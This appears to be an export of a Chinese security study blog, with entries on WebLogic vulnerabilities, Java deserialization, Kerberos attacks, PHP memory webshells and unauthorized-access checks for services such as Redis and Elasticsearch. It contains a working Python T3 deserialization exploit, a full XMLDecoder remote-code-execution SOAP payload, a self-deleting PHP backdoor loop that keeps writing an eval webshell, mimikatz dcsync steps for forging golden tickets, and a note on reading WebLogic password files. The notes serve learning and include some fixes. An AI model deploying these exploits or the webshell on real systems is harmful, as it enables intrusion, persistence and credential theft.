<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct <span class="comment"># 负责大小端的转换</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generatePayload</span>(<span class="params">gadget,cmd</span>):</span><br><span class="line">    YSO_PATH = <span class="string">&quot;ysoserial.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Exploit</span>(<span class="params">ip,port,payload</span>):</span><br><span class="line">    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">compile</span> = re.<span class="built_in">compile</span>(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    <span class="keyword">match</span> = <span class="built_in">compile</span>.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(<span class="keyword">match</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="comment">#return  </span></span><br><span class="line">    <span class="comment"># 1.占位保证总长度计算正确</span></span><br><span class="line">    header = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>)</span><br><span class="line">    <span class="comment"># 2.固定的T3协议头</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    <span class="comment"># 3.weblogic反序列化数据的标签</span></span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>)</span><br><span class="line">    <span class="comment"># 4.跟ysoserial生成的payload拼接起来</span></span><br><span class="line">    payload = header + t3header  +desflag+  payload</span><br><span class="line">    <span class="comment"># 5.计算出长度替换掉用来占位的字符，也就是前四位</span></span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.111.132&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;touch /tmp/success&quot;</span></span><br><span class="line">    payload = generatePayload(gadget,cmd)</span><br><span class="line">    T3Exploit(ip,port,payload)</span><br></pre></td></tr></table></figure>

<p>查看容器的&#x2F;tmp目录发现创建了success文件</p>
<p>再回来看看poc，这个poc本质就是把ysoserial生成的payload变成t3协议里的数据格式。</p>
<ul>
<li>数据包长度包括了自身长度和其他三部分数据包长度，所以需要先占位，计算出长度后再替换进去</li>
<li>T3协议头是固定的，直接硬编码进去就行</li>
<li>反序列化标志+数据&#x3D;weblogic反序列化标志<code>fe010000</code>+ysoserial生成的序列化数据</li>
</ul>
<h5 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h5><blockquote>
<p>resolveclass方法的作用是将类的序列化描述符加工成该类的class对象</p>
</blockquote>
<p>​	Weblogic对CVE-2015-4852的修复措施是在resloveClass里加上 ClassFilter.isBlackListed黑名单过滤，黑名单过滤了CommonCollections</p>
<p>​	开放在外网的情况下，可以采用web代理和负载均衡，<strong>web代理</strong>的方式只能转发http请求，而不会转发推协议的请求，<strong>负载均衡</strong>的情况下，可以指定需要负载均衡的协议类型，这里可以设置为http的请求，不接受其他的协议请求转发，这也是在外网见到T3协议漏洞比较少的原因之一</p>
<h4 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h4><p>基于weblogic t3 协议引起远程代码执行的反序列化</p>
<h4 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h4><p>基于weblogic t3 协议引起远程代码执行的反序列化，属于weblogic JRMP反序列化</p>
<h4 id="CVE-2018-2628-amp-CVE-2018-2893"><a href="#CVE-2018-2628-amp-CVE-2018-2893" class="headerlink" title="CVE-2018-2628&amp;CVE-2018-2893"></a>CVE-2018-2628&amp;CVE-2018-2893</h4><h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><p>10.3.6.0</p>
<p>12.1.3.0</p>
<p>12.2.1.2</p>
<p>12.2.1.3</p>
<h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p>方法一   ： nmap -n -v -p 7001 127.0.0.1 –script weblogic-t3-info</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230625050146188.png" alt="image-20230625050146188"></p>
<p>基于weblogic t3 协议引起远程代码执行的反序列化，属于weblogic JRMP反序列化</p>
<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><h4 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h4><p>访问<a href="http://your-ip:7001/ws_utc/config.do">http://your-ip:7001/ws_utc/config.do</a> ，上传，返回包里有时间戳，一会会作为文件名使用</p>
<p>访问<a href="http://your-ip:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p>
<h4 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h4><p>设置config.do页面登陆授权后访问</p>
<p>ips等防御产品可加入相应的特征</p>
<p>升级到官方最新版本</p>
<h3 id="xmldecoder反序列化"><a href="#xmldecoder反序列化" class="headerlink" title="xmldecoder反序列化"></a>xmldecoder反序列化</h3><h4 id="CVE-2017-3506-amp-CVE-2017-10271"><a href="#CVE-2017-3506-amp-CVE-2017-10271" class="headerlink" title="CVE-2017-3506&amp;CVE-2017-10271"></a>CVE-2017-3506&amp;CVE-2017-10271</h4><p>weblogic  wls组件中存在xmldecoder远程代码执行漏洞，可以构造请求对运行的weblogic中间件进行攻击</p>
<h5 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h5><ul>
<li>WebLogic 10.3.6.0</li>
<li>WebLogic 12.1.3.0</li>
<li>WebLogic 12.2.1.0</li>
<li>WebLogic 12.2.1.1</li>
<li>WebLogic 12.2.1.2</li>
</ul>
<h5 id="漏洞地址"><a href="#漏洞地址" class="headerlink" title="漏洞地址"></a>漏洞地址</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] wls-wsat组件路径(url路径)：</span><br><span class="line"></span><br><span class="line">            /wls-wsat/CoordinatorPortType</span><br><span class="line">            /wls-wsat/CoordinatorPortType11</span><br><span class="line">            /wls-wsat/ParticipantPortType</span><br><span class="line">            /wls-wsat/ParticipantPortType11</span><br><span class="line">            /wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">            /wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">            /wls-wsat/RegistrationRequesterPortType</span><br><span class="line">            /wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>

<p>CVE-2017-3506&#96;修补方案为采用黑名单机制禁用了object标签，这简直不要太好绕，所以CVE-2017-10271来了。</p>
<p>绕过就是把object标签改为void标签就行了，因为从代码层面来看，void和object的handler因为是父子类关系，所以逻辑是高度相同的。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对weblogic路由  http://<span class="doctag">xxx:</span>7001/wls-wsat/CoordinatorPortType 发送如下数据包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改请求头  content-type: text/xml</span></span><br><span class="line"><span class="comment"># 请求数据为:</span></span><br><span class="line"><span class="string">&lt;soapenv:Envelope</span> <span class="string">xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line">  <span class="string">&lt;soapenv:Header&gt;</span></span><br><span class="line">    <span class="string">&lt;work:WorkContext</span> <span class="string">xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line">        <span class="string">&lt;java</span> <span class="string">version=&quot;1.8.0_131&quot;</span> <span class="string">class=&quot;java.beans.XMLDecoder&quot;&gt;</span></span><br><span class="line">          <span class="string">&lt;void</span> <span class="string">class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line">            <span class="string">&lt;array</span> <span class="string">class=&quot;java.lang.String&quot;</span> <span class="string">length=&quot;3&quot;&gt;</span></span><br><span class="line">              <span class="string">&lt;void</span> <span class="string">index=&quot;0&quot;&gt;</span></span><br><span class="line">                <span class="string">&lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line">              <span class="string">&lt;/void&gt;</span></span><br><span class="line">              <span class="string">&lt;void</span> <span class="string">index=&quot;1&quot;&gt;</span></span><br><span class="line">                <span class="string">&lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line">              <span class="string">&lt;/void&gt;</span></span><br><span class="line">              <span class="string">&lt;void</span> <span class="string">index=&quot;2&quot;&gt;</span></span><br><span class="line">                <span class="string">&lt;string&gt;ping</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&lt;/string&gt;</span></span><br><span class="line">              <span class="string">&lt;/void&gt;</span></span><br><span class="line">            <span class="string">&lt;/array&gt;</span></span><br><span class="line">          <span class="string">&lt;void</span> <span class="string">method=&quot;start&quot;/&gt;&lt;/void&gt;</span></span><br><span class="line">        <span class="string">&lt;/java&gt;</span></span><br><span class="line">      <span class="string">&lt;/work:WorkContext&gt;</span></span><br><span class="line">    <span class="string">&lt;/soapenv:Header&gt;</span></span><br><span class="line">  <span class="string">&lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">&lt;/soapenv:Envelope&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要修改java版本，调用类，0，1，2的参数</p>
<p>CVE-2017-10271的补丁则是继续把黑名单补全，可见除了object，还有method，new，array等标签都被做了处理。 object，new，method标签直接被ban，void属性只能设置index，array的class只能设置为byte类型。</p>
<p>使用class标签构造类，但是由于限制了method函数，无法进行函数调用，只能从构造方法下手，且参数为基本类型：</p>
<ul>
<li>构造函数有写文件操作，文件名和内容可控，可以进行getshell。</li>
<li>构造函数有其他的反序列化操作，我们可以进行二次反序列化操作。</li>
<li>构造函数直接有执行命令的操作，执行命令可控。</li>
<li>有其它的可能导致rce的操作，比如表达式注入之类的。</li>
</ul>
<p>目前存在的利用链有：</p>
<ul>
<li>FileSystemXmlApplicationContext-RCE</li>
<li>UnitOfWorkChangeSet-RCE</li>
<li>ysoserial-jdk7u21-RCE</li>
<li>JtaTransactionManager-JNDI注入</li>
</ul>
<h3 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h3><p><a href="http://127.0.0.1:7001/hello/file.jsp?path=">http://127.0.0.1:7001/hello/file.jsp?path=</a></p>
<p>读取后台用户密码</p>
<p>weblogic密码使用AES加密，只需要找到用户的密文和加密是的密钥</p>
<p>这两个文件均位于base_domain下，名为serializedSystemIni.dat和config.xml</p>
<p>在本环境中为.&#x2F;security&#x2F;serializedSystemIni.dat和.&#x2F;config&#x2F;config&#x2F;xml</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="cve-2014-4210"><a href="#cve-2014-4210" class="headerlink" title="cve-2014-4210"></a>cve-2014-4210</h4><h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>10.0.2</p>
<p>10.3.6</p>
<h5 id="漏洞地址-1"><a href="#漏洞地址-1" class="headerlink" title="漏洞地址"></a>漏洞地址</h5><p><a href="http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp">http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp</a></p>
<p>提交的时候 operator参数可控，存在ssrf</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230625043902969.png" alt="image-20230625043902969"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230625045221646.png" alt="image-20230625045221646"></p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2023/06/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>漏洞介绍</p>
<p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中;反序列化即逆过程，由字节流还原成对象。</p>
<p>Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectlnputStream类的readobject()方法用于反序列化。</p>
<p>分析反序列化</p>
<p>java反序列化漏洞</p>
<p>关于防御</p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>学习计划</title>
    <url>/2023/06/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>反序列化入门</p>
<p><a href="https://blog.csdn.net/weixin_45808483/article/details/122545168">https://blog.csdn.net/weixin_45808483/article/details/122545168</a></p>
<p><a href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.788.video.desc.click&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.788.video.desc.click&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
<p>被transient修饰过的变量不能被序列化，因为serialization是吧对象的状态存储到硬盘上，而有些敏感信息，例如银行卡号，是不希望在网络上传输的，transient的作用就是，吧这个变量的生命周期只存在内存中，而不会写到磁盘持久化</p>
<p>Externalizable接口</p>
<p>需要重写writeExternal和readExternal方法，它的效率比Serializable高一些，并且可以决定哪些属性需要序列化（即使是transient修饰的），但是对大量对象，或者重复对象，则效率低</p>
<p>java中自带序列化的类 ， map    hashmap   ，hashmap是重写writeobject和readobject方法的，</p>
<blockquote>
<p>序列化是为了让序列化之前和反序列化之后的数据一样，hashmap中，entry的存放位置是key的hash值来计算，然后存放到数组中的，对于同一个key，在不同的jvm中计算出来的hash值可能是不同的，所以需要hashmap重写writeobject和readobject方法</p>
</blockquote>
<p>yeoserial构造复杂反序列化链</p>
<p><a href="https://www.bilibili.com/video/BV115411K7MX/?spm_id_from=333.337.search-card.all.click&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV115411K7MX/?spm_id_from=333.337.search-card.all.click&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
]]></content>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>kerberos协议</title>
    <url>/2023/06/21/kerberos%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p> <a href="https://blog.csdn.net/zzq060143/article/details/120531735">https://blog.csdn.net/zzq060143/article/details/120531735</a></p>
<h4 id="windows三大认证"><a href="#windows三大认证" class="headerlink" title="windows三大认证"></a>windows三大认证</h4><h5 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h5><p>自己登陆自己电脑</p>
<h5 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h5><p>两台电脑之间要访问资源，可以通过网络认证后进行访问</p>
<h5 id="kerberos-认证"><a href="#kerberos-认证" class="headerlink" title="kerberos 认证"></a>kerberos 认证</h5><blockquote>
<p>域环境中的认证方式</p>
</blockquote>
<h6 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h6><h6 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h6><h6 id="密钥分发中心"><a href="#密钥分发中心" class="headerlink" title="密钥分发中心"></a>密钥分发中心</h6><p>密钥分发中心KDC(Key Distribution Center ) ，密钥分发中心一般又分为两部分，分别是</p>
<p>​		AS(Authentication Server):认证服务器，专门用来认证客户端的身份并发放客户用户访问的TGS的TGT(票据授予票据)</p>
<p>​		TGS(Ticket Granting Server): 票据授予服务器，用来发放整个认证过程以及客户端访问服务端是所系的服务授予票据(Ticket)</p>
<h6 id="三次通信验证机制"><a href="#三次通信验证机制" class="headerlink" title="三次通信验证机制"></a>三次通信验证机制</h6><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230702024819915.png" alt="image-20230702024819915"></p>
<p>第一次：客户端请求AS，传递自己的信息给AS</p>
<p>AS收到请求后，去数据库验证你是否存在，不验证对错，如果存在，AS产生随机的session key，这个key将用于你和TGS的通信</p>
<p>AS会发送两部分信息给你，一部分是TGT，通过KDC自己的密码加密，另一部分通过你的密码加密，如果你的密码是正确的，你可以解密第二部分信息，获取到TGS session key ,如果密码不正确，无法解密，则认证失败，第一部分是TGT你是无法解密的，需要暂时缓存起来。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请求信息 1</span></span><br><span class="line">name</span><br><span class="line">ip</span><br><span class="line">TGT的有效时间</span><br><span class="line"><span class="comment">#回送信息 2</span></span><br><span class="line">name     KDC 自己的密码加密</span><br><span class="line">ip</span><br><span class="line">TGS name</span><br><span class="line">TGT 生命周期</span><br><span class="line">时间戳</span><br><span class="line">TGS session key</span><br><span class="line"></span><br><span class="line">TGS name   你的密码加密</span><br><span class="line">时间戳</span><br><span class="line">生命周期</span><br><span class="line">TGS session key</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>第二次：如果第一部分你已经成功，那你已经获得无法解密的TGT和TGS session key  ，请求TGS，</p>
<p>TGS收到信息后，检查数据库中是否包含你请求的http服务名，如果存在，则通过KDC的密码解密TGT，这时，我们就能获取到TGS session key 然后通过TGS session key去解密你传输的第一部分认证器，获取到你的用户名和时间戳，此时TGS在进行验证：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.对比TGT中的用户名与认证器中的用户</span><br><span class="line">2.比较时间戳</span><br><span class="line">3.检查是否过期</span><br><span class="line">4.检查IP地址是否一致</span><br><span class="line">5.检查认证器是否已在TGS缓存中(避免应答攻击)</span><br><span class="line">6.可以在这部分添加权限认证服务</span><br></pre></td></tr></table></figure>

<p>TGS随机产生一个HTTP service session key ，同时准备http service ticket(ST)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请求信息 3</span></span><br><span class="line">name    TGS session key加密</span><br><span class="line">时间戳</span><br><span class="line">请求的服务名</span><br><span class="line">http service 的ticket的生存周期    明文传输</span><br><span class="line"><span class="comment"># 回送信息 4   </span></span><br><span class="line">name      通过http服务的密码加密(ST)</span><br><span class="line">IP</span><br><span class="line">时间戳</span><br><span class="line">http服务name</span><br><span class="line">ST的生命周期</span><br><span class="line">http service session key</span><br><span class="line"></span><br><span class="line">http服务的name   通过TGS session key加密</span><br><span class="line">时间戳</span><br><span class="line">ST的生命周期</span><br><span class="line">http service session key</span><br></pre></td></tr></table></figure>

<p>你收到信息后，通过TGS session key 解密，获取了HTTP session key,但是你无法解密ST</p>
<p>第三次：前面两步成功后，以后每次获取http服务，在ticket没有过期，或者无更新的情况下，都可以直接进行这一步，省略前面的两个步骤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 请求信息</span><br><span class="line">name    http service session key加密</span><br><span class="line">时间戳</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>服务端收到后，通过自己的密码解压ST(KDC是http服务的密码加密的)，这样就能够获取到http servicesession key 解密好之后，进行检查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.对比ST中的用户名，与认证器中的用户名</span><br><span class="line">2.比较时间戳</span><br><span class="line">3.检查是否过期</span><br><span class="line">4.检查IP地址是否一致</span><br><span class="line">5.检查认证器是否已在HTTP服务的缓冲中</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 回答信息</span><br><span class="line">http服务name</span><br><span class="line">时间戳</span><br></pre></td></tr></table></figure>

<p>你通过缓存的http service session key 解密这部分信息，然后验证是否是你想要的服务器发给你的信息，完成验证</p>
<p>黄金票据: 直接跳过AS ，伪造tgt获得st</p>
<p>伪造条件:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.域名称  (shell net config workstation)</span><br><span class="line">2.域的SID值(shell whoami /user)</span><br><span class="line">3.域的KRBTGT账号的hash(lsadump::dcsync /domain:tset.cocm /all /csv)</span><br><span class="line">4.伪造任意用户名(随便写)</span><br></pre></td></tr></table></figure>

<p>白银票据: 直接伪造ST，更加隐蔽和难以检测</p>
<p>白银票据伪造条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.域名称</span><br><span class="line">2.域sid</span><br><span class="line">3.目标服务器名</span><br><span class="line">4.可利用的服务</span><br><span class="line">5.服务账号的NTLM hash</span><br><span class="line">6.需要伪造的用户名</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="委派攻击、"><a href="#委派攻击、" class="headerlink" title="委派攻击、"></a>委派攻击、</h5><blockquote>
<p>在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的。 </p>
</blockquote>
<p>约束性委派</p>
<p>非约束性委派</p>
<p>基于资源的约束性委派</p>
<p><a href="https://www.bilibili.com/video/BV1rV4y1Q7hN/?spm_id_from=333.999.0.0&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV1rV4y1Q7hN/?spm_id_from=333.999.0.0&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
]]></content>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>php内存马学习</title>
    <url>/2023/07/02/php%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<p>两种</p>
<p>1.不死马，直接用代码写一个死循环，不间断写入php shell,或者执行一段代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);<span class="comment">// 设置脚本执行的最大时间限制。将参数设置为0意味着脚本可以无限制地运行，没有时间限制。</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);<span class="comment">// 用户访问完成代码仍然继续运行</span></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);<span class="comment">// 删除当前正在执行的 PHP 文件。__FILE__ 是一个常量，表示当前执行脚本的文件的完整路径和文件名。</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;<span class="comment">// 无限循环</span></span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;test&quot;]) ?&gt;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="variable">$content</span>);<span class="comment">// 用于将字符串内容写入到文件中</span></span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);<span class="comment">// 让脚本休眠一段时间，以微秒为单位</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>2.fastcgi马，利用php-fpm可以直接通过fastcgi协议通讯的原理，可以指定<code>SCRIPT_FILENAME</code>，去执行机器上存在的 PHP 文件；或者配合<code>auto_prepend_file+php://input</code>，通过每次提交POST code去执行</p>
<p>PHP 中有两个有趣的配置项，</p>
<ul>
<li><code>auto_prepend_file</code>：指定在执行每个php文件之前自动包含的文件。</li>
<li><code>auto_append_file</code>：用于指定在执行每个php文件之后自动包含的文件</li>
</ul>
<p>假设将 <code>auto_prepend_file</code> 设置为 <code>php://input</code>，这就相当于执行任何 PHP 文件前都要包含一遍 POST 的内容。这样的话咱们只需要把PHP代码放在请求里，就会被当作代码被执行。（需要启用远程文件包含选项 <code>allow_url_include</code>）</p>
<p>第一种木马的查杀方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ignore_user_abort(true);</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        $pid = 353; // php-fpm 进程</span><br><span class="line">        @unlink(&quot;shell.php&quot;);</span><br><span class="line">        exec(&quot;kill -9 $pid&quot;);</span><br><span class="line">        usleep(1000);// 我的剑比你的剑快</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>未授权漏洞收集</title>
    <url>/2023/06/28/%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
    <content><![CDATA[<p>默认端口：21, 139, 873, 2049, 2181, 2182, 2375, 5601, 5672, 5900, 5901, 5984, 6379, 6443, 8080, 8088, 8095, 8161, 9100, 9200, 9300, 11211, 15672, 15692, 20048, 25672, 27017</p>
<h3 id="1-redis未授权"><a href="#1-redis未授权" class="headerlink" title="1.redis未授权"></a>1.redis未授权</h3><blockquote>
<p>默认端口6379</p>
</blockquote>
<p>漏洞验证</p>
<p>安装Redis，然后连接到服务。</p>
<p> # yum install redis</p>
<p># redis-cli -h 10.2.20.73 -p 6379</p>
<p>10.2.20.73:6379&gt; info</p>
<h3 id="2-mongodb未授权"><a href="#2-mongodb未授权" class="headerlink" title="2.mongodb未授权"></a>2.mongodb未授权</h3><blockquote>
<p>默认端口27017</p>
</blockquote>
<p>漏洞验证</p>
<p>安装mongodb，然后连接到服务。</p>
<p># yum install mongodb</p>
<p># mongo –host 10.2.20.34 –port 27017</p>
<p>xxx-test:SECONDARY&gt; show dbs</p>
<h3 id="3-memcached未授权访问"><a href="#3-memcached未授权访问" class="headerlink" title="3.memcached未授权访问"></a>3.memcached未授权访问</h3><blockquote>
<p>默认端口11211</p>
</blockquote>
<p>漏洞验证</p>
<p>telnet 10.10.4.89 11211 或 nc -vv <target> 11211</p>
<p>无需用户名密码，可以直接连接memcache 服务的11211端口</p>
<p>使用了 stats 命令来输出 Memcached 服务信息</p>
<h3 id="4-zookeeper未授权"><a href="#4-zookeeper未授权" class="headerlink" title="4.zookeeper未授权"></a>4.zookeeper未授权</h3><blockquote>
<p>默认端口2181，2182</p>
</blockquote>
<p>漏洞验证</p>
<p>安装ZooKeeper，然后连接到服务。</p>
<p>ZooKeeper: <a href="https://zookeeper.apache.org/releases.html">https://zookeeper.apache.org/releases.html</a></p>
<p># wget <a href="https://mirrors.bfsu.edu.cn/apache/zookeeper/zookeeper-3.6.1/apache-zookeeper-3.6.1-bin.tar.gz">https://mirrors.bfsu.edu.cn/apache/zookeeper/zookeeper-3.6.1/apache-zookeeper-3.6.1-bin.tar.gz</a></p>
<p># tar -xzvf apache-zookeeper-3.6.1-bin.tar.gz</p>
<p># cd apache-zookeeper-3.6.1-bin&#x2F;bin</p>
<p># .&#x2F;zkCli.sh -timeout 0 -r -server 10.10.4.72:2181</p>
<p>备注：windows 下为：zkCli.cmd -timeout 0 -r -server 10.10.4.72:2181</p>
<h3 id="5-elasticsearch未授权"><a href="#5-elasticsearch未授权" class="headerlink" title="5.elasticsearch未授权"></a>5.elasticsearch未授权</h3><blockquote>
<p>默认端口 9100，9200，9300</p>
</blockquote>
<p>漏洞验证</p>
<p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务</p>
<p>curl <a href="http://10.2.20.48:9200/">http://10.2.20.48:9200/</a></p>
<p>curl <a href="http://10.2.20.48:9200/_cat">http://10.2.20.48:9200/_cat</a></p>
<p>curl <a href="http://10.2.20.48:9200/_cat/_river/_search">http://10.2.20.48:9200/_cat/_river/_search</a></p>
<p>curl <a href="http://10.2.20.48:9200/cat/indices">http://10.2.20.48:9200/cat/indices</a></p>
<p><a href="http://10.2.20.48:9100/metrics">http://10.2.20.48:9100/metrics</a></p>
<h3 id="6-kibana未授权"><a href="#6-kibana未授权" class="headerlink" title="6.kibana未授权"></a>6.kibana未授权</h3><blockquote>
<p>默认端口5601（最好是直接访问目录，能访问就能shell</p>
</blockquote>
<p>漏洞验证</p>
<p>直接访问kibana的页面，</p>
<p>如：<a href="https://10.10.4.89:5601/">https://10.10.4.89:5601/</a></p>
<p><a href="https://10.10.4.89/app/kibana">https://10.10.4.89/app/kibana</a></p>
<p># <a href="http://10.10.4.89:5601/app/kibana#/">http://10.10.4.89:5601/app/kibana#/</a></p>
<p>并且无需账号密码可以登录进入界面。</p>
